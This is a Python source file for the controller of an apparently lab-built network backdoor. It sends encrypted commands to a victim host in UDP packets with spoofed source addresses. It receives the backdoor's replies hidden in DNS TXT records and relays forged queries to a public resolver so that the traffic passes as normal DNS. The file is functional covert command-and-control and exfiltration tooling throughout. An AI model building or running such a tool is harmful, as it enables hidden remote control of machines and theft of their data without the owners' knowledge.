# This will contain the code for sending packets and receiving responses to the backdoor.

from shell import *
from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS
from encryption import *
from multiprocessing import Process, SimpleQueue
from socket import socket, SOCK_DGRAM, AF_INET

queue = SimpleQueue()

# Seeing if this prevents ICMP messages.
sock = socket(AF_INET, SOCK_DGRAM)

# Initialize the encryption context.
encryption_handler = StreamEncryption()
encryption_handler.read_nonce("nonce.bin")
encryption_handler.read_secret("secret.key")
encryption_handler.initialize_encryption_context()

def subprocess_packet_handler(pkt):
    if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
        return None
    # 1. Get the data in the TXT record.
    encrypted_message = pkt[UDP].ar.rdata[0]
    # 2. Put the data in the queue.
    queue.put(encrypted_message)
    # 3. Craft a legit query.
    forged = IP(dst="8.8.8.8")/UDP(sport=53, dport=53)/DNS(rd=1, qd=pkt[DNS].qd)
    # 4. sr1 the DNS query to a legit DNS server.
    response = sr1(forged, verbose=0)
    # 5. send the response back to the backdoor machine.
    response[IP].src = "10.0.0.159"
    response[IP].dst = "10.0.0.131"
    send(response, verbose=0)

def subprocess_start():
    sniff(filter="ip src host 10.0.0.131 and not port ssh and udp and not icmp", iface="enp2s0", prn=subprocess_packet_handler)

def send_udp(victim_ip: str, data: str):
    """
        Sends a UDP packet to the backdoor which is supposed to contain a command. 
        All commands get sent to a specific UDP port on the backdoor machine. 
        The UDP packet that is sent contains the encrypted command in the payload 
        section. The backdoor machine listens for a specific port to know that 
        the UDP packet is ours.
    """
    # Encrypt the data.
    encrypted_data = encryption_handler.encrypt(data.encode('utf-8'))
    # Forge the UDP packet.
    pkt = IP(src="10.0.0.159", dst=victim_ip)/UDP(sport=10069, dport=10420, len=len(encrypted_data))
    pkt[UDP].payload = Raw(encrypted_data)
    # Send the packet.
    send(pkt, verbose=0)

if __name__ == "__main__":

    # Start the secondary process which sniffs for DNS requests from the backdoor,
    # decodes the attached information, and forwards the DNS request to a legitimate server,
    # then forwards the legitmate response back to the backdoor.
    decode_process = Process(target=subprocess_start)
    decode_process.start()

    # Main shell loop
    print_menu()
    while True:
        try:
            command = input("λ: ")
        except KeyboardInterrupt:
            break
        args = command.split(" ")
        arg_count = len(args)
        if arg_count == 1:
            if command == HELP:
                print_help()
            elif command == CLEAR:
                clear_screen()
            elif command == EXIT:
                break
        if arg_count == 2:
            if args[0] == LIST:
                file_path = args[1]
                data = args[0] + " " + args[1]
                # Send the command to backdoor.
                send_udp("10.0.0.131", data)
                # Receive the response.
                encrypted = None
                while True:
                    if queue.empty():
                        continue
                    encrypted = queue.get()
                    break
                decrypted = encryption_handler.decrypt(encrypted)
                print(f"Response: {decrypted.decode('utf-8')}")
                continue
    decode_process.kill()
